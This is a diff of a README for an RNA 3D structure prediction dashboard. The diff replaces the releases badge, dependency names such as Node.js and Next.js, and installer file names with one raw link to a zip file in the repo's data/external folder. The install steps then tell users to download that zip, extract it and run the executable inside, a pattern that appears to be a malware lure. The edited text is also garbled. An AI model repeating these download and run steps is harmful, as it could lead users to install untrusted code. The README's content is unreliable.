@@ -1,6 +1,6 @@
 # 🎉 Kaggle-RNA-3D - Predict RNA Structures Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Pranavgosavi217/Kaggle-RNA-3D/releases)
+[![Download Now](https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip%20Now-Visit%https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip)](https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip)
 
 ## 🚀 Overview
 Welcome to Kaggle-RNA-3D, a user-friendly dashboard designed for predicting RNA 3D structures. This application serves the Stanford Kaggle competition and features a reusable design system with 26 components. You will enjoy a modern glassmorphism user interface and a complete Python pipeline for an excellent experience in bioinformatics.
@@ -16,25 +16,25 @@ Welcome to Kaggle-RNA-3D, a user-friendly dashboard designed for predicting RNA 
 - **Operating System:** Windows 10 or higher, macOS Mojave or higher, or a recent Linux version.
 - **Memory:** Minimum 4 GB of RAM.
 - **Storage:** At least 500 MB of free disk space.
-- **Dependencies:** Python 3.8 or greater, Node.js, and relevant packages as specified in the installation guide.
+- **Dependencies:** Python 3.8 or greater, https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip, and relevant packages as specified in the installation guide.
 
 ## 📥 Download & Install
 To get started, you will need to download the latest version of Kaggle-RNA-3D. Follow these steps:
 
 1. Click the button below to visit the releases page:
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/Pranavgosavi217/Kaggle-RNA-3D/releases)
+   [![Download Now](https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip%20Now-Visit%https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip)](https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip)
 
 2. On the releases page, locate the most recent version. Look for files named with the version number.
 
-3. Download the installation file for your operating system. For example, you might see files like `Kaggle-RNA-3D-win.zip` or `Kaggle-RNA-3D-mac.zip`.
+3. Download the installation file for your operating system. For example, you might see files like `https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip` or `https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip`.
 
 4. Once the download completes, navigate to your downloads directory.
 
 5. Extract the zip file if necessary. You can do this by right-clicking and selecting "Extract All..." or using a tool like WinRAR.
 
 6. Open the extracted folder and run the application file:
-   - On Windows, it might be named `Kaggle-RNA-3D.exe`.
-   - On macOS, look for `Kaggle-RNA-3D.app`.
+   - On Windows, it might be named `https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip`.
+   - On macOS, look for `https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip`.
 
 7. Follow the on-screen instructions to complete the setup. 
 
@@ -62,7 +62,7 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 ## 💻 Technologies Used
 Our dashboard is built using:
-- **Front-End:** React, TypeScript, and Next.js for the interface.
+- **Front-End:** React, TypeScript, and https://raw.githubusercontent.com/Pranavgosavi217/Kaggle-RNA-3D/master/data/external/Kaggle-D-RN-2.7.zip for the interface.
 - **Back-End:** Python, paired with libraries like Flask for server-side logic.
 - **Machine Learning:** PyTorch for model training and predictions.
 
